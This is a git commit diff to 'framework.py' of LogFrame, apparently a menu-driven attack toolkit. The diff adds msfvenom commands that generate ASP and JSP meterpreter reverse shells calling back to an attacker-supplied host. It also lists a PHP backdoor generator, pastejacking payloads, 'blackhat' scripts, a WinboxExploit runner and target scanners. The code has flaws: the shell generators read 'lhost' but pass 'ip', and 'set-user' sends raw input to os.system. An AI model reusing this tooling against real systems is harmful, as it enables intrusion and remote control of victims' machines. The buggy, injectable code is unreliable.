e1c33c346541a3735d6f729ec6569d3c19c479f2
Joy Ghosh <36255129+JoyGhoshs@users.noreply.github.com>
2020-06-05 10:03:27 -0400

    Updated

--- framework.py
+++ framework.py
@@ -1,14 +1,17 @@
 # LogFrame-
 # By Joyghosh
+#Updated-05.06.2020
 import sys
 import os
 import requests
 execute=os.system
 myip='dig +short myip.opendns.com @resolver1.opendns.com'
-mymac="ifconfig | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}"
+mymac="ifconfig | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'"
 tor="xterm -e 'tor'"
 vpn="python pyscripts/vpn.py"
 localhost="./tools/localhost.sh"
+usr="cat user"
+uagent='"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"'
 #------------------------------------------------Logo------------------------------------------------------#
 def logo():
     print("""
@@ -42,6 +45,8 @@ def mainmenu():
 [-] burp-browser          (An Proxied Browser It Works With BurpProxy)
 [-] grub-banner           (Grub Target Banner)
 [-] bad-tools             (Some Scripts Used By Blackhat)
+[-] whoami                (To Show Username on Tool)
+[-] set-user              (To Assign New Username For Tool)
     """)
 def sys():
     print("""
@@ -54,6 +59,8 @@ def sys():
 -| locate           (File Path Locator)
 -| ip-locate        (Ip Locator)
 -| localhost.run    (Port Forwording Tool)
+-| show-target      (Show The Target You Have Set On Startup)
+-| get-targetip     (Get Ip Adress of Target Host)
     """)
 def ncr():
     print("""
@@ -78,10 +85,13 @@ def info():
 [*] get-wpu               (Enumerate Wordpress Username)
 [*] get-wpp               (Enumerate Wordpress Plugins)
 [*] get-wpt               (Enumerate Wordpress Themes)
+[*] whatweb-target        (Scan Target Using WhatWeb)
     """)
 def backdoor():
     print("""
-|-| gen-phpshell            (Generate Metasploit Based Revarshell)
+|-| gen-phpshell            (Generate Metasploit Based Php Revarshell)
+|-| gen-aspshell            (Generate Metasploit Based Asp Revarshell)
+|-| gen-jspshell            (Generate Metasploit Based jsp Revarshell)
 |-| gen-jsshell             (Generate Javascript Revarshell)
 |-| gen-backdoor            (Generate SimplePhp Based Backdoor [Raw Code])
 |-| pastejacking            (Generate pastejacking Demo Payload)
@@ -105,6 +115,7 @@ def pentool():
 [|] commix                       (Command Injection Exploition Tool)
 [|] xss-scan                     (Auto Scan For Xss Using XssCon)
 [|] cadaver                      (To Exploit Http Put Method and Upload Shell)
+[|] xsrf-scan                    (To scan For Cross Site Request Forgery Using xsrfprobe)
     """)
 def dev():
     print("""
@@ -377,13 +388,43 @@ def main():
         execute('python3 tools/WinboxExploit/WinboxExploit.py '+ip+' '+port)
         main()
     elif inp=="whoami":
-        print("root@logframe")
+        execute(usr)
         main()
     elif inp=="bad-tools":
         print("""
 
 
         """)
+        main()
+    elif inp=="xsrf-scan":
+        execute('xsrfprobe --url '+url+' --crawl --user-agent '+uagent)
+        main()
+    elif inp=="gen-aspshell":
+        lhost=input("Enter Your Ip Adress:- ")
+        execute('msfvenom -p windows/meterpreter/reverse_tcp LHOST='+ip+' LPORT=4444 >> shell.asp')
+        print("Saved as : shell.asp In")
+        execute('pwd')
+        main()
+    elif inp=="gen-jspshell":
+        lhost=input("Enter Your Ip Adress:- ")
+        execute('msfvenom -p java/jsp_shell_reverse_tcp LHOST='+ip+' LPORT=4444 >> shell.jsp')
+        print("Saved as : shell.jsp In")
+        execute('pwd')
+        main()
+    elif inp=="show-target":
+        print("Your Target :- "+url)
+        main()
+    elif inp=="get-targetip":
+        execute('for server in '+url+'; do echo $server "-"; dig $server +short; done | paste -d " " - - -')
+        main()
+    elif inp=="whatweb-target":
+        execute("whatweb "+url)
+        main()
+    elif inp=="set-user":
+        name=input("Enter Your New Username:- ")
+        execute('rm user')
+        execute('echo '+name+' >>user')
+        main()
 
     else:
         print(""+inp+ " Command Not Found")
